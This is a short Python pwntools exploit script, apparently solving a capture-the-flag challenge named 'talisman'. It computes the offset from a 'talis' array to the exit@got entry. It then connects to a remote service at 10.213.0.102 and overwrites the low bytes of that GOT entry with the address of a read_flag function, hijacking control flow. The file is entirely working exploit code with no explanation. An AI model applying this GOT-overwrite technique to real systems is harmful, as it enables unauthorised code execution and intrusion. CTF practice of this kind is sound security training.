from pwn import *

context.arch = 'amd64'

elf = ELF('./talisman')

read_flag = elf.symbols['read_flag']
exit_got = elf.got['exit']
talis = elf.symbols['talis']

print(f"read_flag: {hex(read_flag)}")
print(f"exit@got: {hex(exit_got)}")
print(f"talis: {hex(talis)}")

# Calculate offset
offset = (exit_got - talis) // 8
print(f"Offset: {offset}")

p = remote("10.213.0.102", 40051)
p.recvuntil(b">> ")
p.sendline(str(offset).encode())

p.recvuntil(b"Spell: ")
p.send(p16(read_flag & 0xFFFF))  # Write lower 2 bytes

p.interactive()